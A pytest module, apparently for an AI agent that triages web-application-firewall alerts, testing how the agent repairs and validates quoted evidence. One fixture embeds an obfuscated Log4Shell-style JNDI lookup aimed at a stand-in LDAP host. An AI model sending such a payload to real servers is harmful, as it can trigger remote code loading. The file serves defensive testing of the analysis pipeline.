"""Offline regressions for citation-only repair; all data and model replies are synthetic."""
import asyncio
import copy
import json

import httpx
import pytest
from moduagent.output import PydanticOutputCodec
from pydantic import ValidationError

from app.agent.contracts import (
    AgentVerdict, CONTRACT_ERRORS, EvidenceCorrectionOutput, ThreatSeverity, TuningRecommendation, WAFAnalysisOutput,
)
from app.agent.evidence import EvidenceSourceResolver
from app.agent.executor import _repair_instructions, _safe_validation_issues, _TrackingOutputCodec, execute_structured_agent
from app.agent.input_builder import build_agent_input, TRUNCATION_MARKER
from app.models import Analysis
from app.services.http_parser import parse_http_payload
from app.services.payload_decoding import decode_payload
from test_agent_executor import fake_result, install_fake_agents, profile, valid_output
from test_grounding_repair import correction, execute
from test_moduagent_worker import primary_output


def test_repair_preserves_valid_citations_and_all_non_citation_fields(monkeypatch):
    first = primary_output("q=fixture")
    first.evidence.append(first.evidence[0].model_copy(update={"excerpt": "missing", "field": "payload.body"}))
    before = first.model_dump(mode="json")
    call, calls = execute(monkeypatch, [first, correction("fixture", index=1)])
    expected = copy.deepcopy(before)
    expected["evidence"][1].update(field="payload.query", excerpt="fixture")
    assert call.output.model_dump(mode="json") == expected
    assert first.model_dump(mode="json") == before
    assert calls[0]["instructions"] == "fixed-fixture-policy"
    assert calls[1]["output_model"] is EvidenceCorrectionOutput
    feedback = json.loads(calls[1]["user_input"])["evidence_correction"]["items"]
    assert [item["index"] for item in feedback] == [1]
    assert feedback[0]["interpretation_ko"] == first.evidence[1].interpretation_ko
    assert call.telemetry["evidence_grounding_retry"]["recovered"]
    assert call.grounding_history[1]["output"]["corrections"][0]["index"] == 1


def test_bare_cr_quote_can_be_repaired_without_losing_valid_signature(monkeypatch):
    raw = 'POST /profile HTTP/1.1\rContent-Type: application/json\r\r{"name":"D\'Angelo"}'
    first = primary_output(raw.replace("\r", "\r\n"), "payload")
    first.verdict, first.threat_analysis.severity = AgentVerdict.false_positive, ThreatSeverity.NONE
    first.evidence[0].interpretation_ko = "본문의 이름 문자열에 작은따옴표가 포함되어 있습니다."
    first.evidence.append(first.evidence[0].model_copy(update={"field": "signature", "excerpt": "HTTP Inspection"}))
    analysis = Analysis(signature="HTTP Inspection", extra_fields={})
    call, calls = execute(monkeypatch, [first, correction("D'Angelo", "payload")], raw=raw, analysis=analysis)
    assert len(calls) == 2  # The server did not normalize CR into CRLF to pass the first quote.
    assert call.output.verdict == AgentVerdict.false_positive
    assert len(call.output.evidence) == 2
    assert call.output.evidence[1] == first.evidence[1]
    assert call.grounding_history[0]["rejected_evidence"] == [{"index": 0, "reason": "excerpt_not_in_source"}]
    assert json.loads(calls[1]["user_input"])["event"]["payload"] == raw


@pytest.mark.parametrize("remaining_field,remaining_excerpt", [("signature", "HTTP Inspection"), ("payload.query", "q=fixture")])
def test_unrepairable_claim_does_not_confirm_from_remaining_evidence_alone(monkeypatch, remaining_field, remaining_excerpt):
    first = primary_output("missing")
    first.evidence.append(first.evidence[0].model_copy(update={"field": remaining_field, "excerpt": remaining_excerpt}))
    failed_repair = EvidenceCorrectionOutput(corrections=[], requires_reanalysis=False)
    call, calls = execute(monkeypatch, [first, failed_repair], analysis=Analysis(signature="HTTP Inspection", extra_fields={}))
    assert len(calls) == 2 and call.succeeded
    assert call.output.verdict == AgentVerdict.inconclusive
    assert call.output.evidence == [first.evidence[1]]
    assert call.output.threat_analysis.severity == ThreatSeverity.UNKNOWN
    assert not call.output.tuning_recommendation.recommended
    assert call.telemetry["evidence_grounding"]["accepted_count"] == 1
    assert call.telemetry["evidence_grounding_retry"]["requires_review"]


def test_attempt_to_overwrite_valid_evidence_is_rejected(monkeypatch):
    first = primary_output("q=fixture")
    first.evidence.append(first.evidence[0].model_copy(update={"excerpt": "missing"}))
    call, _ = execute(monkeypatch, [first, correction("fixture", index=0)])
    assert call.output.verdict == AgentVerdict.inconclusive
    assert call.output.evidence == [first.evidence[0]]
    assert {"index": 0, "reason": "correction_index_not_requested"} in call.grounding_history[1]["rejected_evidence"]


def test_incomplete_correction_preserves_valid_and_repaired_items_but_abstains(monkeypatch):
    first = primary_output("q=fixture")
    first.evidence.extend(first.evidence[0].model_copy(update={"excerpt": marker}) for marker in ("missing-one", "missing-two"))
    call, _ = execute(monkeypatch, [first, correction("fixture", index=1)])
    assert call.output.verdict == AgentVerdict.inconclusive
    assert [item.excerpt for item in call.output.evidence] == ["q=fixture", "fixture"]
    assert call.telemetry["evidence_grounding"]["rejected_count"] == 1


def test_empty_feedback_budget_skips_unusable_model_retry(monkeypatch):
    first = primary_output("missing")
    first.evidence[0].interpretation_ko = "\u0000" * 2000
    call, calls = execute(monkeypatch, [first])
    assert len(calls) == 1 and call.output.verdict == AgentVerdict.inconclusive
    assert call.telemetry["evidence_grounding_retry"]["skipped_reason"] == "feedback_budget_exceeded"


def test_correcting_every_bad_quote_to_signature_alone_does_not_rescue_verdict(monkeypatch):
    first = primary_output("missing")
    call, _ = execute(monkeypatch, [first, correction("HTTP Inspection", "signature")],
                      analysis=Analysis(signature="HTTP Inspection", extra_fields={}))
    assert call.output.verdict == AgentVerdict.inconclusive
    assert call.output.evidence[0].field == "signature"
    assert call.telemetry["evidence_grounding"]["rejected_count"] == 0
    assert call.telemetry["evidence_grounding_retry"]["context_only_evidence"]
    assert not call.telemetry["evidence_grounding_retry"]["recovered"]


def test_reanalysis_request_disables_tuning_even_if_original_verdict_was_already_inconclusive(monkeypatch):
    first = primary_output("missing")
    first.verdict, first.threat_analysis.severity = AgentVerdict.inconclusive, ThreatSeverity.UNKNOWN
    first.tuning_recommendation = TuningRecommendation(recommended=True, scope="parameter", proposal_ko="가상 제안",
                                                       risk_ko="가상 위험", validation_ko="가상 검증")
    call, _ = execute(monkeypatch, [first, correction(requires_reanalysis=True)])
    assert call.output.verdict == AgentVerdict.inconclusive
    assert not call.output.tuning_recommendation.recommended
    assert not call.telemetry["evidence_grounding"]["downgraded_to_inconclusive"]
    assert call.telemetry["evidence_grounding"]["correction_requires_review"]


@pytest.mark.parametrize("raw", [
    "GET /?q=%3Cfixture%3E HTTP/1.1\r\n\r\n",
    "GET / HTTP/1.1\r\nX-Fixture: ${${lower:J}ndi:ldap://synthetic.invalid/a}\r\n\r\n",
    "한글 로그: \\u003cfixture\\u003e",
])
@pytest.mark.parametrize("index_path", [".0", "[0]"])
def test_submitted_decoder_original_is_resolved_without_extra_model_call(monkeypatch, raw, index_path):
    built = build_agent_input({}, raw, parse_http_payload(raw), 32768, 3072, decoding=decode_payload(raw))
    hints = json.loads(built.text)["decoded_payload_hints"]
    assert hints["raw_source_field"] == "payload"
    original = hints["items"][0]["original"]
    first = primary_output(original, f"decoded_payload_hints.items{index_path}.original")
    before = first.model_dump(mode="json")
    call, calls = execute(monkeypatch, [first], raw=raw, built=built)
    assert len(calls) == 1 and call.output.evidence[0].field == "payload"
    assert call.output.evidence[0].excerpt == original
    assert call.telemetry["evidence_grounding_retry"]["resolved_source_count"] == 1
    source = call.grounding_history[0]["source_resolutions"][0]
    assert raw[source["start"]:source["end"]] == original
    assert original not in json.dumps(call.telemetry)
    assert first.model_dump(mode="json") == before


@pytest.mark.parametrize("field,excerpt", [
    ("decoded_payload_hints.items.0.decoded", "<fixture>"),
    ("decoded_payload_hints.items.0.original", "<fixture>"),
    ("decoded_payload_hints.items.9.original", "%3Cfixture%3E"),
    ("decoded_payload_hints.items.0.original", "different-raw-value"),
    ("payload.query.other", "%3Cfixture%3E"),
])
def test_invalid_source_is_not_rescued_by_searching_elsewhere(monkeypatch, field, excerpt):
    raw = "GET /?q=%3Cfixture%3E&other=different-raw-value HTTP/1.1\r\n\r\n"
    built = build_agent_input({}, raw, parse_http_payload(raw), 32768, 3072, decoding=decode_payload(raw))
    call, calls = execute(monkeypatch, [primary_output(excerpt, field), correction(excerpt, field)], raw=raw, built=built)
    assert len(calls) == 2 and call.output.verdict == AgentVerdict.inconclusive
    assert call.output.evidence == []
    assert call.telemetry["evidence_grounding_retry"]["resolved_source_count"] == 0


def test_decoder_mapping_requires_exact_submitted_occurrence_not_duplicate_text():
    raw = "%3Cfixture%3E " + "x" * 20000 + " %3Cfixture%3E " + "y" * 20000
    decoding = decode_payload(raw)
    second = decoding["items"][1]
    resolver = EvidenceSourceResolver(raw, {}, submitted_payload_spans=((0, 100),),
                                     decoding_hints={"raw_source_field": "payload", "items": [second]})
    assert resolver.matches("payload", second["original"])
    assert resolver.resolve_decoder_original("decoded_payload_hints.items.0.original", second["original"]) is None


@pytest.mark.parametrize("change", [{"start": True}, {"start": -1}, {"end": 9999}, {"end": 0}, {"original": "forged"}])
def test_forged_tool_source_is_not_accepted(change):
    raw = "%3Cfixture%3E"
    item = {**decode_payload(raw)["items"][0], **change}
    resolver = EvidenceSourceResolver(raw, {}, submitted_payload_spans=((0, len(raw)),),
                                     decoding_hints={"raw_source_field": "payload", "items": [item]})
    assert resolver.resolve_decoder_original("decoded_payload_hints.items.0.original", "%3Cfixture%3E") is None


def test_evidence_is_checked_in_submitted_raw_spans_not_joined_or_omitted_text():
    raw = "abcdef"
    resolver = EvidenceSourceResolver(raw, {}, submitted_payload_spans=((0, 2), (4, 6)))
    assert resolver.matches("payload", "ab") and resolver.matches("payload", "ef")
    assert resolver.rejection_reason("payload", "cd") == "excerpt_not_submitted"
    assert resolver.rejection_reason("payload", "abcdef") == "excerpt_not_submitted"
    assert not resolver.matches("payload", "abef")
    assert not resolver.matches("payload", TRUNCATION_MARKER)


def test_subfield_cannot_borrow_a_submitted_duplicate_from_another_field():
    raw = "GET /?q=shared HTTP/1.1\r\n\r\nshared"
    start = raw.rindex("shared")
    resolver = EvidenceSourceResolver(raw, {}, submitted_payload_spans=((start, len(raw)),))
    assert resolver.matches("payload.body", "shared")
    assert resolver.rejection_reason("payload.query.q", "shared") == "excerpt_not_submitted"


def test_metadata_evidence_must_exist_in_raw_and_submitted_corresponding_field():
    resolver = EvidenceSourceResolver("fixture", {"signature": "head-secret-tail", "event_name": "elsewhere"},
                                     submitted_event={"signature": "head…"})
    assert resolver.matches("signature", "head")
    assert resolver.rejection_reason("signature", "secret") == "excerpt_not_submitted"
    assert resolver.rejection_reason("event_name", "elsewhere") == "excerpt_not_submitted"
    assert not resolver.matches("signature", "head…")


@pytest.mark.parametrize("patch", [
    {"verdict": "false_positive"}, {"summary_ko": "replace"}, {"requires_reanalysis": "false"},
    {"corrections": [{"index": True, "field": "payload", "excerpt": "x"}]},
    {"corrections": [{"index": 5, "field": "payload", "excerpt": "x"}]},
    {"corrections": [{"index": 0, "field": "payload", "excerpt": "x", "interpretation_ko": "replace"}]},
    {"corrections": [{"index": 0, "field": "payload", "excerpt": "x"}] * 2},
])
def test_citation_contract_cannot_rewrite_analysis_or_accept_ambiguous_indexes(patch):
    with pytest.raises(ValidationError):
        EvidenceCorrectionOutput.model_validate({"corrections": [], "requires_reanalysis": False, **patch})


@pytest.mark.parametrize("code,verdict,severity", [
    ("true_positive_requires_threat_severity", "true_positive", "UNKNOWN"),
    ("false_positive_requires_none_severity", "false_positive", "HIGH"),
    ("inconclusive_requires_unknown_severity", "inconclusive", "NONE"),
    ("decisive_verdict_requires_evidence", "true_positive", "HIGH"),
    ("recommended_tuning_requires_scope_proposal_risk_and_validation", "true_positive", "HIGH"),
])
def test_contract_failure_has_specific_safe_location_code_and_action(code, verdict, severity):
    data = valid_output().model_dump(mode="json")
    data["verdict"], data["threat_analysis"]["severity"] = verdict, severity
    data["summary_ko"] = "sensitive-fixture-must-not-leak"
    if code == "decisive_verdict_requires_evidence":
        data["evidence"] = []
    if code.startswith("recommended_tuning"):
        data["tuning_recommendation"] = {"recommended": True}
    codec = _TrackingOutputCodec(PydanticOutputCodec(WAFAnalysisOutput))
    with pytest.raises(ValidationError):
        codec.decode({"message": {"content": json.dumps(data)}})
    field, instruction = CONTRACT_ERRORS[code]
    assert codec.validation_issues == [{"field": field, "type": code}]
    feedback = _repair_instructions(codec.validation_issues)
    assert instruction in feedback and code in feedback
    assert data["summary_ko"] not in feedback


def test_arbitrary_ascii_error_type_cannot_escape_into_metadata_or_instructions():
    class UnsafeError(Exception):
        def errors(self, **kwargs):
            return [{"loc": (), "type": "secret_fixture_123", "msg": "sensitive", "ctx": {"error": "sensitive"}}]
    assert _safe_validation_issues(UnsafeError()) == [{"field": "$", "type": "validation_error"}]


@pytest.mark.parametrize("strict", [False, True])
def test_citation_codec_schema_and_error_locations_work_for_both_providers(strict):
    codec = _TrackingOutputCodec(PydanticOutputCodec(EvidenceCorrectionOutput), strict=strict,
                                output_model=EvidenceCorrectionOutput)
    schema = codec.schema()
    assert set(schema["properties"]) == {"corrections", "requires_reanalysis"}
    assert schema["additionalProperties"] is False
    assert set(schema["required"]) == set(schema["properties"])
    assert codec.decode({"message": {"content": correction().model_dump_json()}}) == correction()
    with pytest.raises(ValidationError):
        codec.decode({"message": {"content": '{"corrections":[{"index":9,"field":"payload","excerpt":"x"}],"requires_reanalysis":false}'}})
    assert codec.validation_issues == [{"field": "corrections.[].index", "type": "less_than_equal"}]


def test_executor_uses_citation_contract_without_nested_schema_retry(monkeypatch):
    reply = correction()
    created, sessions = install_fake_agents(monkeypatch, [fake_result(output=reply, run_id="citation-run")])
    calls = []
    result = asyncio.run(execute_structured_agent(profile=profile(), api_key=None, instructions="citation instructions",
        user_input="synthetic fixture", session_id="fixture:repair", agent_name="waf-primary-evidence-repair",
        egress_check=lambda: calls.append(True), output_model=EvidenceCorrectionOutput, output_validation_max_attempts=1))
    assert result.output == reply and result.succeeded
    assert len(created) == 1 and sessions == ["fixture:repair"] and calls
    assert set(created[0]["output"].schema()["properties"]) == {"corrections", "requires_reanalysis"}
    assert result.telemetry["output_validation_retry"]["max_attempts"] == 1


def test_executor_refuses_nested_retry_for_citation_contract():
    with pytest.raises(ValueError, match="evidence_correction_requires_single_attempt"):
        asyncio.run(execute_structured_agent(profile=profile(), api_key=None, instructions="fixture", user_input="fixture",
            session_id="fixture", agent_name="fixture", output_model=EvidenceCorrectionOutput))


@pytest.mark.parametrize("provider", ["vllm", "openai"])
@pytest.mark.parametrize("invalid", [False, True])
def test_actual_moduagent_citation_wire_schema_failure_and_egress(monkeypatch, provider, invalid):
    from test_agent_openai import completion, install_http, openai_profile, assert_strict_schema
    data = correction().model_dump(mode="json")
    if invalid:
        data["verdict"] = "false_positive"  # Citation repair is not another judgment.
    requests, options = install_http(monkeypatch, lambda request, count: httpx.Response(200, json=completion(json.dumps(data))))
    selected = openai_profile() if provider == "openai" else profile()
    checked = []
    result = asyncio.run(execute_structured_agent(profile=selected, api_key="synthetic-key", instructions="citation only",
        user_input="synthetic input", session_id="synthetic", agent_name="waf-primary-evidence-repair",
        egress_check=lambda: checked.append(True), output_model=EvidenceCorrectionOutput, output_validation_max_attempts=1))
    assert len(requests) == 1 and len(checked) >= 2
    assert result.succeeded is not invalid
    assert result.telemetry["output_validation_retry"]["attempt_count"] == 1
    assert options == [{"verify": True, "follow_redirects": False, "trust_env": False}]
    schema = json.loads(requests[0].content)["response_format"]["json_schema"]["schema"]
    assert set(schema["properties"]) == {"corrections", "requires_reanalysis"}
    if provider == "openai":
        assert_strict_schema(schema)
    if invalid:
        assert result.telemetry["output_validation_retry"]["attempts"][0]["validation_issues"] == [{"field": "<unknown>", "type": "extra_forbidden"}]


@pytest.mark.parametrize("provider", ["vllm", "openai"])
def test_actual_schema_retry_receives_specific_contract_fix_without_output_text(monkeypatch, provider):
    from test_agent_openai import completion, install_http, openai_profile
    bad = valid_output().model_dump(mode="json")
    bad["threat_analysis"]["severity"] = "NONE"
    bad["summary_ko"] = "private_fixture_output_do_not_echo"
    requests, _ = install_http(monkeypatch, lambda request, count: httpx.Response(
        200, json=completion(json.dumps(bad) if count == 1 else valid_output().model_dump_json())))
    selected = openai_profile() if provider == "openai" else profile()
    result = asyncio.run(execute_structured_agent(profile=selected, api_key="synthetic-key", instructions="fixture policy",
        user_input="synthetic input", session_id="synthetic", agent_name="waf-primary", egress_check=lambda: None))
    assert result.succeeded and len(requests) == 2
    retry_input = requests[1].content.decode()
    assert "true_positive_requires_threat_severity" in retry_input
    assert bad["summary_ko"] not in retry_input
    assert bad["summary_ko"] not in json.dumps(result.telemetry)


def test_long_parser_fixture_keeps_jndi_source_linked_after_input_truncation(monkeypatch):
    from test_parser_stress_dataset import EVENTS, META
    event = EVENTS[45]
    raw = event["payload"]
    parsed = parse_http_payload(raw)
    built = build_agent_input({key: value for key, value in event.items() if key not in META}, raw, parsed,
                             32768, 3072, decoding=decode_payload(raw))
    document = json.loads(built.text)
    assert built.input_truncated and not META.intersection(document["event"])
    hints = document["decoded_payload_hints"]["items"]
    index = next(index for index, item in enumerate(hints) if "ldap://" in item["original"])
    excerpt = hints[index]["original"]
    first = primary_output(excerpt, f"decoded_payload_hints.items.{index}.original")
    call, calls = execute(monkeypatch, [first], raw=raw, built=built)
    assert len(calls) == 1 and call.output.evidence[0].field == "payload"
    assert call.output.evidence[0].excerpt == excerpt and call.output.input_truncated
    assert call.telemetry["evidence_grounding_retry"]["resolved_source_count"] == 1


def test_five_corrections_keep_original_order_and_meaning(monkeypatch):
    first = primary_output("missing-0")
    first.evidence = [first.evidence[0].model_copy(update={"excerpt": f"missing-{index}", "interpretation_ko": f"기존 해석 {index}"})
                      for index in range(5)]
    patch = EvidenceCorrectionOutput(corrections=[{"index": index, "field": "payload.query", "excerpt": "fixture"}
                                                 for index in reversed(range(5))], requires_reanalysis=False)
    call, _ = execute(monkeypatch, [first, patch])
    assert call.telemetry["evidence_grounding_retry"]["recovered"]
    assert [item.interpretation_ko for item in call.output.evidence] == [f"기존 해석 {index}" for index in range(5)]
